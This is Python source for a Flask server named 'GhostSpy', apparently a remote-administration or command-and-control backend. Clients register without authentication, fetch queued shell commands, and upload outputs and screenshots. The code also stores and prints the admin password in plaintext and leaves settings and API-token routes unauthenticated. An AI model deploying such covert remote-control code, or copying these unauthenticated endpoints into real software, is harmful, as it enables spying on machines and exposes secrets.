import os
import sys
import sqlite3
import logging
import json
import time
import secrets
import threading
from flask import Flask, Response, request, jsonify, send_from_directory
from functools import wraps
import customtkinter as ctk
from datetime import datetime
import subprocess
import base64
import io
from PIL import Image
import threading

app = Flask(__name__)

CONFIG_FILE = 'config.json'
DATABASE = 'clients.db'
SCHEMA_FILE = 'schema.sql'
SCREENSHOT_FOLDER = 'screenshots'
UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), SCREENSHOT_FOLDER)
TIMEOUT_SECONDES = 60  # Définir le délai après lequel un client est considéré comme déconnecté (ici 60 secondes)

def load_credentials():
    # regarde si les identifiants ont déjà été créer ou non
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            return config.get('admin_username', ''), config.get('admin_password', '')
    return None, None

def save_credentials(username, password):
    with open(CONFIG_FILE, 'w') as f:
        json.dump({
            'admin_username': username,
            'admin_password': password
        }, f)


class Interface(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.geometry("600x400")
        self.title("Interface Administrateur")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        self.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.admin_username = ""
        self.admin_password = ""

        #frame
        frame = ctk.CTkFrame(master=self)
        frame.place(relx=0.5, rely=0.5, anchor="center")
        frame.pack(pady=20, padx=40, fill="x", expand=True)

        #Info pour se connecter
        label = ctk.CTkLabel(master=frame, text='Connection à la session', font=("Geist", 16))
        label.pack(pady=12, padx=10)

        self.user_entry = ctk.CTkEntry(master=frame, placeholder_text="Pseudo", width=300, height=40, font=("Geist", 14))
        self.user_entry.pack(pady=12, padx=10)

        self.user_pass = ctk.CTkEntry(master=frame, placeholder_text="Mot de passe", width=300, height=40, show="*", font=("Geist", 14))
        self.user_pass.pack(pady=12, padx=10)

        self.user_confirm_pass = ctk.CTkEntry(master=frame, placeholder_text="Confirmer le mot de passe", width=300, height=40, show="*", font=("Geist", 14))
        self.user_confirm_pass.pack(pady=12, padx=10)

        button = ctk.CTkButton(master=frame, text='Se connecter', command=self.login, font=("Geist", 14))
        button.pack(pady=12, padx=10)

        #Label qui s'affiche seulement si les deux mots de passe ne sont pas les même
        self.label_status = ctk.CTkLabel(master=frame, text="", font=("Arial", 20))
        self.label_status.pack(padx=10)

    def on_closing(self):
            quit()
            
    def login(self):
        username = self.user_entry.get()
        passwd = self.user_pass.get()
        confirm = self.user_confirm_pass.get()

        if passwd != confirm:
            self.label_status.configure(text="Les mots de passe ne correspondent pas.", text_color="red")
            self.user_pass.delete(0, "end")
            self.user_confirm_pass.delete(0, "end")
            return

        self.label_status.configure(text = "Les identifiant ont bien été configurés.", text_color="green")
        save_credentials(username, passwd)
        self.admin_username = username
        self.admin_password = passwd
        self.destroy()  # Close the window



# Create/Chargement des identifiants
ADMIN_USERNAME, ADMIN_PASSWORD = load_credentials()

if ADMIN_USERNAME is None or ADMIN_PASSWORD is None or ADMIN_USERNAME == '' or ADMIN_PASSWORD == '':
    interface = Interface()
    interface.mainloop()
    ADMIN_USERNAME = interface.admin_username
    ADMIN_PASSWORD = interface.admin_password
    print(f"\n✅ Identifiants enregistrés : {ADMIN_USERNAME} / {ADMIN_PASSWORD}\n")
else:
    print(f"\n✅ Configuration chargée depuis {CONFIG_FILE} : {ADMIN_USERNAME} / {ADMIN_PASSWORD}\n")

# Fonction pour l'authentification HTTP Basic
def auth_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
            return Response(
                'Accès refusé', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    return decorated

def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row # Permet d'accéder aux colonnes par nom
    return conn

def init_db():
    """
    Initialise la base de données avec les tables nécessaires
    en utilisant des commandes SQL directes pour éviter les problèmes de fichier.
    """
    global DATABASE  # Déplacer cette ligne au début de la fonction
    
    print("\n=== INITIALISATION DE LA BASE DE DONNÉES GHOSTSPY ===\n")
    
    # Utiliser un fichier temporaire pour éviter les problèmes de verrouillage
    temp_db = DATABASE + ".new"
    
    try:
        # Supprimer le fichier temporaire s'il existe déjà
        if os.path.exists(temp_db):
            os.remove(temp_db)
            
        # Créer une nouvelle base de données temporaire
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        print(f"Création de la base de données temporaire {temp_db}...")
        
        # Schéma SQL - Table des clients
        cursor.execute("""
        DROP TABLE IF EXISTS clients;
        """)
        
        cursor.execute("""
        CREATE TABLE clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            os_type TEXT NOT NULL,
            last_checkin INTEGER,
            is_connected BOOLEAN DEFAULT 0,
            last_screenshot_path TEXT,
            command_to_execute TEXT,
            command_output TEXT,
            add_api_key TEXT,
            resources TEXT,
            pdf_report_path TEXT,
            activity_logs TEXT,
            
            -- Paramètres des fonctionnalités
            settings_virustotal_enabled INTEGER DEFAULT 0,
            settings_activity_logs_enabled INTEGER DEFAULT 0,
            settings_file_detection_enabled INTEGER DEFAULT 0,
            settings_system_resources_enabled INTEGER DEFAULT 0
        );
        """)
        
        print("Table 'clients' créée avec succès.")
        
        # Schéma SQL - Table de l'historique des commandes
        cursor.execute("""
        DROP TABLE IF EXISTS command_history;
        """)
        
        cursor.execute("""
        CREATE TABLE command_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id INTEGER NOT NULL,
            command TEXT NOT NULL,
            command_id TEXT,
            button_type TEXT DEFAULT 'Manual',
            status TEXT DEFAULT 'pending',
            stdout TEXT,
            stderr TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (client_id) REFERENCES clients (id)
        );
        """)
        
        print("Table 'command_history' créée avec succès.")
        
        # Validation du schéma
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
        tables = cursor.fetchall()
        print(f"Tables créées: {[table[0] for table in tables]}")
        
        # Valider la structure de la table clients
        cursor.execute("PRAGMA table_info(clients);")
        clients_columns = cursor.fetchall()
        print(f"Colonnes de la table 'clients': {len(clients_columns)} colonnes")
        
        # Valider la structure de la table command_history
        cursor.execute("PRAGMA table_info(command_history);")
        history_columns = cursor.fetchall()
        print(f"Colonnes de la table 'command_history': {len(history_columns)} colonnes")
        
        # Sauvegarder les modifications
        conn.commit()
        conn.close()
        print(f"Base de données temporaire créée avec succès!")
        
        # Remplacer la base de données existante par la nouvelle
        try:
            # Sur Windows, on ne peut pas remplacer un fichier ouvert
            # On renomme d'abord l'ancien fichier s'il existe
            if os.path.exists(DATABASE):
                backup_db = DATABASE + ".bak"
                # Supprimer l'ancienne sauvegarde si elle existe
                if os.path.exists(backup_db):
                    os.remove(backup_db)
                # Renommer l'actuelle en backup
                os.rename(DATABASE, backup_db)
                print(f"Ancienne base de données renommée en {backup_db}")
            
            # Renommer la nouvelle base de données
            os.rename(temp_db, DATABASE)
            print(f"Nouvelle base de données installée avec succès!")
            
        except Exception as rename_err:
            print(f"Erreur lors du remplacement de la base de données: {rename_err}")
            print("Utilisation de la base de données temporaire à la place.")
            DATABASE = temp_db  # Modification de la variable globale
        
    except sqlite3.Error as e:
        print(f"Erreur SQLite lors de la création de la base de données: {e}")
    except Exception as e:
        print(f"Erreur inattendue lors de la création de la base de données: {e}")

@app.cli.command('initdb') # Pour initialiser la base de données avec la commande flask initdb
def initdb_command():
    """Initialise la base de données."""
    init_db()
    print('Base de données initialisée.')


@app.route('/clients', methods=['GET'])
@auth_required
def get_clients():
    conn = get_db_connection()
    clients = conn.execute('SELECT * FROM clients').fetchall()
    conn.close()
    clients_list = []
    for client in clients:
        clients_list.append(dict(client)) # Convertir sqlite3.Row en dictionnaire
    return jsonify(clients_list)

@app.route('/client/checkin', methods=['POST'])
def client_checkin():
    data = request.get_json()
    if not data or 'name' not in data or 'os_type' not in data:
        return jsonify({'message': 'Données invalides'}), 400

    name = data['name']
    os_type = data['os_type']

    conn = get_db_connection()
    client = conn.execute('SELECT id FROM clients WHERE name = ?', (name,)).fetchone()

    if client: # Client déjà enregistré, on met à jour le timestamp de connexion
        conn.execute('UPDATE clients SET last_checkin = ?, is_connected = ? WHERE id = ?', (int(time.time()), True, client['id']))
        client_id = client['id']
    else: # Nouveau client, on l'enregistre avec les paramètres par défaut
        cur = conn.cursor()
        cur.execute('''INSERT INTO clients 
                    (name, os_type, last_checkin, is_connected, 
                     settings_virustotal_enabled, settings_activity_logs_enabled, 
                     settings_file_detection_enabled, settings_system_resources_enabled) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                    (name, os_type, int(time.time()), True, 0, 0, 0, 0))
        client_id = cur.lastrowid

    conn.commit()
    conn.close()
    return jsonify({'message': 'Check-in réussi', 'client_id': client_id}), 200

@app.route('/client/<int:client_id>/screenshot', methods=['POST'])
def receive_screenshot(client_id):
    app.logger.debug(f"Received screenshot request from client {client_id}") # Log

    if 'screenshot' not in request.files:
        app.logger.warning("No screenshot file found in request") # Log
        return jsonify({'message': 'Pas de screenshot reçu'}), 400

    screenshot_file = request.files['screenshot']
    try:
        if not os.path.exists(UPLOAD_FOLDER):
            os.makedirs(UPLOAD_FOLDER)
            app.logger.info(f"Created directory: {UPLOAD_FOLDER}") # Log

        filename = f"client_{client_id}_latest.png"
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        screenshot_file.save(filepath)
        app.logger.info(f"Screenshot saved to: {filepath}") # Log

        conn = get_db_connection()
        conn.execute('UPDATE clients SET last_screenshot_path = ? WHERE id = ?', (filepath, client_id))
        conn.commit()
        conn.close()
        app.logger.info(f"Screenshot path updated in database for client {client_id}") # Log
        return jsonify({'message': 'Screenshot reçu et enregistré (live video)'}), 200

    except Exception as e:
        app.logger.error(f"Error processing screenshot: {e}") # Log the error
        return jsonify({'message': f'Erreur lors de l\'enregistrement du screenshot: {str(e)}'}), 500

@app.route('/client/<int:client_id>/command', methods=['POST'])
@auth_required
def execute_command_on_client(client_id):
    data = request.get_json()
    if not data or 'command' not in data:
        return jsonify({'message': 'Commande non spécifiée'}), 400

    command = data['command']
    command_id = data.get('command_id')
    button_type = data.get('button_type', 'Manual')  # 'Manual' par défaut si non spécifié
    
    # On stocke la commande et son id sous forme de JSON
    import json as _json
    command_payload = _json.dumps({'command': command, 'command_id': command_id})
    conn = get_db_connection()
    
    # Enregistrer la commande dans l'historique
    conn.execute(
        'INSERT INTO command_history (client_id, command, command_id, button_type, status) VALUES (?, ?, ?, ?, ?)',
        (client_id, command, command_id, button_type, 'pending')
    )
    
    conn.execute('UPDATE clients SET command_to_execute = ? WHERE id = ?', (command_payload, client_id))
    conn.commit()
    conn.close()
    return jsonify({'message': 'Commande enregistrée pour exécution par le client'}), 200

@app.route('/client/<int:client_id>/token', methods=['POST'])
@auth_required
def Put_API_on_client(client_id):
    data = request.get_json()
    if not data or 'token' not in data:
        return jsonify({'message': 'API non spécifiée'}), 400

    token = data['token']
    print(token)
    conn = get_db_connection()
    conn.execute('UPDATE clients SET add_api_key = ? WHERE id = ?', (token, client_id))
    conn.commit()
    conn.close()
    return jsonify({'message': 'API enregistrée pour exécution par le client'}), 200

@app.route('/client/<int:client_id>/getcommand', methods=['GET'])
def get_command_for_client(client_id):
    """Récupère la commande à exécuter pour un client et la supprime de la base de données."""
    conn = get_db_connection()
    client = conn.execute('SELECT command_to_execute FROM clients WHERE id = ?', (client_id,)).fetchone()
    command_payload = client['command_to_execute'] if client else None

    if command_payload:
        # Une fois la commande récupérée, on la supprime de la base de données pour ne pas la réexécuter
        conn.execute('UPDATE clients SET command_to_execute = ? WHERE id = ?', (None, client_id))
        conn.commit()
        conn.close()
        import json as _json
        try:
            payload = _json.loads(command_payload)
        except Exception:
            payload = {'command': command_payload, 'command_id': None}
        return jsonify(payload), 200
    else:
        conn.close()
        return jsonify({'command': None, 'command_id': None}), 200


@app.route('/client/<int:client_id>/token', methods=['GET'])
def get_api_for_client(client_id):
    """Récupère la API pour un client et la suprime de la base de données."""
    conn = get_db_connection()
    client = conn.execute('SELECT add_api_key FROM clients WHERE id = ?', (client_id,)).fetchone()
    api = client['add_api_key'] if client else None

    return jsonify({'api': api}), 200
    # if command:
    #     # Une fois la commande récupérée, on la supprime de la base de données pour ne pas la réexécuter
    #     conn.execute('UPDATE clients SET add_api_key  = ? WHERE id = ?', (None, client_id))
    #     conn.commit()
    #     conn.close()
    #     return jsonify({'api': api}), 200
    # else:
    #     conn.close()
    #     return jsonify({'api': None}), 200



@app.route('/client/<int:client_id>/disconnect', methods=['POST'])
def disconnect_client(client_id):
    """Déconnecte un client en mettant à jour son statut dans la base de données."""
    conn = get_db_connection()
    conn.execute('UPDATE clients SET is_connected = ? WHERE id = ?', (False, client_id))
    conn.commit()
    conn.close()
    return jsonify({'message': f'Client ID {client_id} déconnecté.'}), 200


app.static_folder = 'frontend'

@app.route('/')
@auth_required
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/<path:path>')
@auth_required
def serve_static_files(path):
    return send_from_directory(app.static_folder, path)

@app.route('/screenshots/<filename>') # Nouvelle route pour servir les screenshots
@auth_required
def serve_screenshot(filename):
    return send_from_directory(UPLOAD_FOLDER, filename) # Utiliser UPLOAD_FOLDER

@app.route('/client/<int:client_id>/commandresult', methods=['POST'])
def receive_command_result(client_id):
    data = request.get_json()
    if not data:
        return jsonify({'message': 'Données invalides'}), 400
    
    # On s'assure que command_id est bien stocké avec le résultat
    conn = get_db_connection()
    import json as _json
    
    # Mettre à jour l'historique avec le résultat
    command_id = data.get('command_id')
    stdout = data.get('stdout', '')
    stderr = data.get('stderr', '')
    status = 'success' if not stderr or stderr.strip() == '' else 'error'
    
    if command_id:
        conn.execute(
            'UPDATE command_history SET status = ?, stdout = ?, stderr = ? WHERE client_id = ? AND command_id = ?',
            (status, stdout, stderr, client_id, command_id)
        )
    
    conn.execute('UPDATE clients SET command_output = ? WHERE id = ?', 
                (_json.dumps(data), client_id))
    conn.commit()
    conn.close()
    return jsonify({'message': 'Résultat de commande enregistré'}), 200

@app.route('/client/<int:client_id>/commandresult', methods=['GET'])
@auth_required
def get_command_result(client_id):
    conn = get_db_connection()
    client = conn.execute('SELECT command_output FROM clients WHERE id = ?', (client_id,)).fetchone()
    conn.close()
    import json as _json
    if client and client['command_output']:
        return jsonify({'output': _json.loads(client['command_output'])}), 200
    else:
        return jsonify({'output': None}), 200

@app.route('/client/<int:client_id>', methods=['GET'])
@auth_required
def get_client_by_id(client_id):
    """Get client details by ID."""
    conn = get_db_connection()
    client = conn.execute('SELECT id, name, os_type, is_connected FROM clients WHERE id = ?', (client_id,)).fetchone()
    conn.close()
    
    if client:
        return jsonify(dict(client)), 200
    else:
        return jsonify({'error': 'Client not found'}), 404

def verifier_deconnexions():
    """Fonction exécutée périodiquement pour vérifier si des clients sont déconnectés."""
    with app.app_context(): # Créer un contexte d'application Flask pour accéder à la base de données
        conn = get_db_connection()
        clients = conn.execute('SELECT id, last_checkin, is_connected FROM clients').fetchall()
        now = int(time.time())

        for client in clients:
            if client['is_connected']: # Vérifier uniquement les clients actuellement marqués comme connectés
                last_checkin_time = client['last_checkin']
                if last_checkin_time is not None and (now - last_checkin_time) > TIMEOUT_SECONDES:
                    # Si le dernier check-in est plus vieux que le délai, on considère le client comme déconnecté
                    conn.execute('UPDATE clients SET is_connected = ? WHERE id = ?', (False, client['id']))
                    print(f"Client ID {client['id']} considéré comme déconnecté (timeout)") # Log pour le débogage

        conn.commit()
        conn.close()

def demarrer_verificateur_deconnexions():
    """Démarre une tâche de fond qui vérifie les déconnexions périodiquement."""
    def tache_verification():
        while True:
            verifier_deconnexions()
            time.sleep(10)  # Vérifier les déconnexions toutes les 10 secondes (ajuster si nécessaire)

    thread_verification = threading.Thread(target=tache_verification)
    thread_verification.daemon = True # Le thread s'arrête quand l'application principale s'arrête
    thread_verification.start()

@app.route('/client/<int:client_id>/resources', methods=['POST'])
def receive_resources(client_id):
    data = request.get_json()
    if not data:
        return jsonify({'message': 'Données invalides'}), 400
    
    conn = get_db_connection()
    conn.execute('UPDATE clients SET resources = ? WHERE id = ?', 
                (json.dumps(data), client_id))
    conn.commit()
    conn.close()
    
    return jsonify({'message': 'Données de ressources système enregistrées'}), 200

@app.route('/client/<int:client_id>/resources', methods=['GET'])
@auth_required
def get_resources(client_id):
    conn = get_db_connection()
    client = conn.execute('SELECT resources FROM clients WHERE id = ?', (client_id,)).fetchone()
    conn.close()
    
    if client and client['resources']:
        return jsonify({'resources': json.loads(client['resources'])}), 200
    else:
        return jsonify({'resources': None}), 200

# Nouvelle route pour récupérer l'historique des commandes
@app.route('/client/<int:client_id>/command_history', methods=['GET'])
@auth_required
def get_command_history(client_id):
    conn = get_db_connection()
    
    # Option pour filtrer par type de bouton
    button_type = request.args.get('button_type')
    
    if button_type:
        history = conn.execute(
            'SELECT * FROM command_history WHERE client_id = ? AND button_type = ? ORDER BY timestamp DESC LIMIT 100',
            (client_id, button_type)
        ).fetchall()
    else:
        history = conn.execute(
            'SELECT * FROM command_history WHERE client_id = ? ORDER BY timestamp DESC LIMIT 100',
            (client_id,)
        ).fetchall()
    
    conn.close()
    
    # Convertir les résultats en liste de dictionnaires
    history_list = []
    for item in history:
        history_list.append(dict(item))
    
    return jsonify(history_list), 200

# Définition unique pour cette route avec méthode GET et sans auth
@app.route('/client/<int:client_id>/settings', methods=['GET'])
def get_client_settings_for_client(client_id):
    """Route pour permettre aux clients de récupérer leurs paramètres sans authentification."""
    conn = get_db_connection()
    client = conn.execute(
        'SELECT settings_virustotal_enabled, settings_activity_logs_enabled, settings_file_detection_enabled, settings_system_resources_enabled FROM clients WHERE id = ?',
        (client_id,)
    ).fetchone()
    conn.close()
    
    if client:
        return jsonify({
            'virustotal_enabled': bool(client['settings_virustotal_enabled']),
            'activity_logs_enabled': bool(client['settings_activity_logs_enabled']),
            'file_detection_enabled': bool(client['settings_file_detection_enabled']),
            'system_resources_enabled': bool(client['settings_system_resources_enabled'])
        })
    else:
        return jsonify({
            'virustotal_enabled': False,
            'activity_logs_enabled': False,
            'file_detection_enabled': False,
            'system_resources_enabled': False
        }), 404

# Définition unique pour cette route avec méthode GET et auth
@app.route('/client/<int:client_id>/settings/admin', methods=['GET'])
def get_client_settings(client_id):
    """Route pour l'interface web (admin) pour récupérer les paramètres d'un client."""
    conn = get_db_connection()
    client = conn.execute(
        'SELECT settings_virustotal_enabled, settings_activity_logs_enabled, settings_file_detection_enabled, settings_system_resources_enabled FROM clients WHERE id = ?',
        (client_id,)
    ).fetchone()
    conn.close()
    
    if client:
        return jsonify({
            'virustotal_enabled': bool(client['settings_virustotal_enabled']),
            'activity_logs_enabled': bool(client['settings_activity_logs_enabled']),
            'file_detection_enabled': bool(client['settings_file_detection_enabled']),
            'system_resources_enabled': bool(client['settings_system_resources_enabled'])
        })
    else:
        return jsonify({'error': 'Client non trouvé'}), 404

# Définition unique pour cette route avec méthode POST et auth
@app.route('/client/<int:client_id>/settings', methods=['POST'])
def update_client_settings(client_id):
    """Met à jour les paramètres de fonctionnalités pour un client spécifique."""
    data = request.get_json()
    if not data:
        return jsonify({'message': 'Données invalides'}), 400
    
    # Extrait les valeurs des paramètres (défaut à None si non spécifiés)
    virustotal_enabled = data.get('virustotal_enabled')
    activity_logs_enabled = data.get('activity_logs_enabled')
    file_detection_enabled = data.get('file_detection_enabled')
    system_resources_enabled = data.get('system_resources_enabled')
    
    # Construit la requête SQL de mise à jour dynamiquement en fonction des paramètres fournis
    update_fields = []
    params = []
    
    if virustotal_enabled is not None:
        update_fields.append('settings_virustotal_enabled = ?')
        params.append(1 if virustotal_enabled else 0)
        
    if activity_logs_enabled is not None:
        update_fields.append('settings_activity_logs_enabled = ?')
        params.append(1 if activity_logs_enabled else 0)
        
    if file_detection_enabled is not None:
        update_fields.append('settings_file_detection_enabled = ?')
        params.append(1 if file_detection_enabled else 0)
        
    if system_resources_enabled is not None:
        update_fields.append('settings_system_resources_enabled = ?')
        params.append(1 if system_resources_enabled else 0)
    
    # Si aucun champ à mettre à jour n'a été fourni
    if not update_fields:
        return jsonify({'message': 'Aucun paramètre valide fourni'}), 400
    
    # Ajoute l'ID client aux paramètres
    params.append(client_id)
    
    # Exécute la requête de mise à jour
    conn = get_db_connection()
    conn.execute(
        f"UPDATE clients SET {', '.join(update_fields)} WHERE id = ?", 
        params
    )
    conn.commit()
    conn.close()
    
    return jsonify({'message': 'Paramètres mis à jour avec succès'}), 200

# Définition unique pour la route des paramètres effectifs du client
@app.route('/client/settings', methods=['GET'])
def get_client_effective_settings():
    """Renvoie les paramètres effectifs pour un client basé sur son ID."""
    client_id = request.args.get('client_id')
    
    if not client_id:
        return jsonify({'message': 'ID client non spécifié'}), 400
    
    try:
        client_id = int(client_id)
    except ValueError:
        return jsonify({'message': 'ID client invalide'}), 400
    
    conn = get_db_connection()
    client = conn.execute('''
        SELECT settings_virustotal_enabled, 
               settings_activity_logs_enabled, 
               settings_file_detection_enabled, 
               settings_system_resources_enabled 
        FROM clients 
        WHERE id = ?
    ''', (client_id,)).fetchone()
    conn.close()
    
    if client:
        settings = {
            'virustotal_enabled': bool(client['settings_virustotal_enabled']),
            'activity_logs_enabled': bool(client['settings_activity_logs_enabled']),
            'file_detection_enabled': bool(client['settings_file_detection_enabled']),
            'system_resources_enabled': bool(client['settings_system_resources_enabled'])
        }
        return jsonify(settings), 200
    else:
        # Par défaut, toutes les fonctionnalités sont désactivées si le client n'est pas trouvé
        default_settings = {
            'virustotal_enabled': False,
            'activity_logs_enabled': False,
            'file_detection_enabled': False,
            'system_resources_enabled': False
        }
        return jsonify(default_settings), 200

# Définition unique pour la route GET des paramètres globaux
@app.route('/global/settings', methods=['GET'])
def get_global_settings():
    """Récupère les paramètres globaux (moyenne des paramètres de tous les clients)."""
    conn = get_db_connection()
    
    # Récupérer le nombre total de clients
    count = conn.execute('SELECT COUNT(*) as total FROM clients').fetchone()['total']
    
    if count == 0:
        # Valeurs par défaut si aucun client n'est enregistré
        default_settings = {
            'virustotal_enabled': False,
            'activity_logs_enabled': False,
            'file_detection_enabled': False,
            'system_resources_enabled': False
        }
        return jsonify(default_settings), 200
        
    # Récupérer la somme des paramètres de tous les clients
    settings_sum = conn.execute('''
        SELECT 
            SUM(settings_virustotal_enabled) as vt_sum,
            SUM(settings_activity_logs_enabled) as logs_sum,
            SUM(settings_file_detection_enabled) as file_sum,
            SUM(settings_system_resources_enabled) as res_sum
        FROM clients
    ''').fetchone()
    
    conn.close()
    
    # Déterminer la valeur majoritaire (> 50%) pour chaque paramètre
    settings = {
        'virustotal_enabled': settings_sum['vt_sum'] > count / 2,
        'activity_logs_enabled': settings_sum['logs_sum'] > count / 2,
        'file_detection_enabled': settings_sum['file_sum'] > count / 2,
        'system_resources_enabled': settings_sum['res_sum'] > count / 2
    }
    
    return jsonify(settings), 200

# Définition unique pour la route POST des paramètres globaux
@app.route('/global/settings', methods=['POST'])
def update_global_settings():
    """Applique les mêmes paramètres à tous les clients."""
    data = request.get_json()
    if not data:
        return jsonify({'message': 'Données invalides'}), 400
    
    # Extraire les valeurs des paramètres
    virustotal_enabled = data.get('virustotal_enabled')
    activity_logs_enabled = data.get('activity_logs_enabled')
    file_detection_enabled = data.get('file_detection_enabled')
    system_resources_enabled = data.get('system_resources_enabled')
    
    # Construire la requête SQL de mise à jour
    update_fields = []
    params = []
    
    if virustotal_enabled is not None:
        update_fields.append('settings_virustotal_enabled = ?')
        params.append(1 if virustotal_enabled else 0)
        
    if activity_logs_enabled is not None:
        update_fields.append('settings_activity_logs_enabled = ?')
        params.append(1 if activity_logs_enabled else 0)
        
    if file_detection_enabled is not None:
        update_fields.append('settings_file_detection_enabled = ?')
        params.append(1 if file_detection_enabled else 0)
        
    if system_resources_enabled is not None:
        update_fields.append('settings_system_resources_enabled = ?')
        params.append(1 if system_resources_enabled else 0)
    
    # Si aucun champ à mettre à jour n'a été fourni
    if not update_fields:
        return jsonify({'message': 'Aucun paramètre valide fourni'}), 400

    # Exécuter la requête de mise à jour pour tous les clients
    conn = get_db_connection()
    conn.execute(f"UPDATE clients SET {', '.join(update_fields)}", params)
    
    # Compter le nombre de clients mis à jour
    clients_count = conn.execute('SELECT COUNT(*) as total FROM clients').fetchone()['total']
    
    conn.commit()
    conn.close()
    
    return jsonify({'message': 'Paramètres mis à jour pour tous les clients', 'clients_updated': clients_count}), 200

# Ajouter une route spécifique pour la page settings.html
@app.route('/setting.html')
def settings_page():
    return send_from_directory(app.static_folder, 'setting.html')

# Ajouter une route pour réinitialiser la base de données si nécessaire
@app.route('/reset_database', methods=['POST'])
@auth_required
def reset_database():
    try:
        conn = None
        
        # Créer un nouveau fichier de base de données temporaire
        temp_db = DATABASE + '.new'
        
        # Initialiser la nouvelle base de données
        conn = sqlite3.connect(temp_db)
        with app.open_resource('schema.sql', mode='r') as f:
            conn.cursor().executescript(f.read())
        
        # Créer un client par défaut pour les paramètres globaux
        conn.execute('''
            INSERT INTO clients (
                name, os_type, last_checkin, is_connected,
                settings_virustotal_enabled, settings_activity_logs_enabled,
                settings_file_detection_enabled, settings_system_resources_enabled
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', ('DefaultClient', 'System', int(time.time()), 0, 0, 0, 0, 0))
        
        conn.commit()
        if conn:
            conn.close()
        
        # Essayer de remplacer l'ancienne DB par la nouvelle
        try:
            if os.path.exists(DATABASE):
                os.rename(DATABASE, DATABASE + '.bak')  # Faire une sauvegarde
            os.rename(temp_db, DATABASE)
            
            # Supprimer la sauvegarde si tout s'est bien passé
            if os.path.exists(DATABASE + '.bak'):
                try:
                    os.remove(DATABASE + '.bak')
                except OSError:
                    pass  # Ignorer si on ne peut pas supprimer la sauvegarde
                
        except OSError:
            # Si le remplacement échoue, utiliser la nouvelle DB directement
            pass
            
        return jsonify({'message': 'Base de données réinitialisée avec succès'}), 200
        
    except Exception as e:
        # En cas d'erreur, logger l'exception et renvoyer un message d'erreur
        app.logger.error(f"Erreur lors de la réinitialisation de la base de données: {str(e)}")
        return jsonify({'message': f'Erreur lors de la réinitialisation de la base de données: {str(e)}'}), 500

# Ajouter une route pour exécuter pdf_data.py sur le client
@app.route('/client/<int:client_id>/generate_pdf', methods=['POST'])
@auth_required
def execute_pdf_command(client_id):
    """Exécute la commande pour générer un rapport PDF sur le client et le télécharger."""
    # Utiliser une commande simple pour exécuter directement pdf_data.py
    command = "python pdf_data.py"
    command_id = f"pdf_report_{int(time.time())}"
    
    # Logguer l'action pour débogage
    app.logger.info(f"Demande de génération de PDF pour le client {client_id}")
    
    # Enregistrer la commande dans l'historique
    conn = get_db_connection()
    conn.execute(
        'INSERT INTO command_history (client_id, command, command_id, button_type, status) VALUES (?, ?, ?, ?, ?)',
        (client_id, command, command_id, 'PDFReport', 'pending')
    )
    
    # Envoyer la commande au client
    command_payload = json.dumps({'command': command, 'command_id': command_id})
    conn.execute('UPDATE clients SET command_to_execute = ? WHERE id = ?', (command_payload, client_id))
    conn.commit()
    conn.close()
    
    return jsonify({'message': 'Commande de génération de PDF envoyée au client', 'command_id': command_id}), 200

# Fonction pour s'assurer que la colonne activity_logs existe dans la table clients et l'ajouter si nécessaire
def ensure_activity_logs_column():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        columns = [column[1] for column in cursor.execute('PRAGMA table_info(clients)').fetchall()]
        
        if 'activity_logs' not in columns:
            conn.execute('ALTER TABLE clients ADD COLUMN activity_logs TEXT')
            conn.commit()
            print("Colonne activity_logs ajoutée à la table clients")
        else:
            print("Colonne activity_logs existe déjà.")
        conn.close()
    except sqlite3.OperationalError as e:
        print(f"Erreur SQLite lors de la vérification/ajout de la colonne activity_logs: {e}")
    except Exception as e:
        print(f"Erreur inattendue lors de la vérification/ajout de la colonne activity_logs: {e}")

def ensure_pdf_report_path_column():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        columns = [column[1] for column in cursor.execute('PRAGMA table_info(clients)').fetchall()]
        
        if 'pdf_report_path' not in columns:
            conn.execute('ALTER TABLE clients ADD COLUMN pdf_report_path TEXT')
            conn.commit()
            print("Colonne pdf_report_path ajoutée à la table clients")
        else:
            print("Colonne pdf_report_path existe déjà.")
        conn.close()
    except sqlite3.OperationalError as e:
        print(f"Erreur SQLite lors de la vérification/ajout de la colonne pdf_report_path: {e}")
    except Exception as e:
        print(f"Erreur inattendue lors de la vérification/ajout de la colonne pdf_report_path: {e}")

# Appel au démarrage du serveur
ensure_activity_logs_column()
ensure_pdf_report_path_column()

# Ajouter une route pour récupérer le PDF généré
@app.route('/client/<int:client_id>/download_pdf', methods=['GET', 'HEAD'])
@auth_required
def download_pdf(client_id):
    """Télécharge le rapport PDF généré par le client."""
    try:
        # Obtenir le chemin absolu du répertoire de l'application (où se trouve server.exe)
        app_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
        app.logger.info(f"Recherche du PDF pour le client {client_id} depuis le répertoire: {app_dir}")
        
        # Définir les chemins de fichiers possibles
        pdf_paths = []
        
        # 1. Vérifier dans le dossier pdf_reports
        pdf_reports_dir = os.path.join(app_dir, 'pdf_reports')
        pdf_filename = f"client_{client_id}_network_report.pdf"
        pdf_path = os.path.join(pdf_reports_dir, pdf_filename)
        
        if os.path.exists(pdf_path):
            pdf_paths.append(pdf_path)
            app.logger.info(f"PDF trouvé dans le dossier pdf_reports: {pdf_path}")
        
        # 2. Vérifier le fichier data.pdf dans le répertoire principal
        data_pdf_path = os.path.join(app_dir, 'data.pdf')
        if os.path.exists(data_pdf_path):
